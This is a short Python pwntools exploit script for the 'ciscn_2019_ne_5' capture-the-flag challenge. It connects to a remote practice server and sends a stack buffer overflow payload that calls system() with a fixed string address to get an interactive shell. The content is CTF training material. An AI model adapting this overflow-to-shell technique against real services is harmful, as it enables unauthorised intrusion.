from pwn import *

elf = ELF("./ciscn_2019_ne_5")
context.arch = 'i386'
r = remote("node3.buuoj.cn", 26591)
r.recvuntil(":")
r.sendline("administrator")
r.recvuntil("t\n:")
r.sendline("1")
r.recvuntil("info:")
r.sendline('a' * 0x4C + flat([elf.plt["system"],0x804891B,0x80482EA]))
r.recvuntil("t\n:")
r.sendline("4")
r.recvline()
r.interactive()